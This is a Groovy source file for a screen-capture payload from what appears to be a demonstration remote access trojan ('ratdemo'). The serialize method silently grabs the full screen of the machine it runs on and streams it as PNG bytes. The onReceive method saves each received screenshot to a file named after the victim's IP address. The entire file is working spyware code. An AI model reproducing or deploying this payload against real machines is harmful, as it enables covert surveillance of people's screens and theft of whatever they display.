package de.tudbut.ttd.ratdemo.payload.impl

import de.tudbut.ttd.ratdemo.payload.Payload
import de.tudbut.ttd.ratdemo.payload.PayloadCommunicator
import tudbut.io.TypedInputStream
import tudbut.io.TypedOutputStream

import javax.imageio.ImageIO
import java.awt.*
import java.awt.image.BufferedImage

class ScreenPayload implements Payload {

    @Override
    void serialize(TypedOutputStream stream) {
        Robot robot = new Robot()
        BufferedImage image = robot.createScreenCapture(new Rectangle(0, 0, 10000, 5000))
        ByteArrayOutputStream out = new ByteArrayOutputStream()
        ImageIO.write(image, 'png', out)
        byte[] bytes = out.toByteArray()
        stream.writeInt(bytes.length as int)
        bytes.collect {
            stream.writeByte(it)
        }
    }

    @Override
    void onReceive(TypedInputStream stream, String ip, PayloadCommunicator communicator) {
        ByteArrayOutputStream out = new ByteArrayOutputStream()
        int i = stream.readInt()
        for (j in 0..<i) {
            out.write(stream.readByte())
        }
        ByteArrayInputStream inp = new ByteArrayInputStream(out.toByteArray())
        BufferedImage image = ImageIO.read(inp)
        ImageIO.write(image, 'png', new File("${ip}_screen.png"))
    }
}
